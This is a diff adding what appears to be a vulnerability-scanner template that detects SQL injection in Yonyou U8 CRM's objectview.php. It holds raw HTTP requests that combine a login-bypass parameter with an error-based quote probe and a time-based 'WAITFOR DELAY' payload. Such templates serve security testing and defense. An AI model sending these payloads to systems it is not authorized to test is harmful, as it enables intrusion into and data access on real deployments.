@@ -1,0 +1,52 @@
+id: poc-yaml-yongyon-u8-crm-objectview-php-sqli
+info:
+  name: 用友U8 CRM objectview.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    用友U8 CRM objectview.php endpoint is vulnerable to a SQL Injection vulnerability that could lead to unauthorized data access or manipulation.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /pub/objectview.php?DontCheckLogin=1&ObjType=1&ID=1' HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - "Fatal error"
+        part: body
+
+  - raw:
+      - |
+        POST /pub/objectview.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Type: application/x-www-form-urlencoded
+
+        DontCheckLogin=1&ObjType=1&ID=1';WAITFOR+DELAY+'0:0:{{t1}}'--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
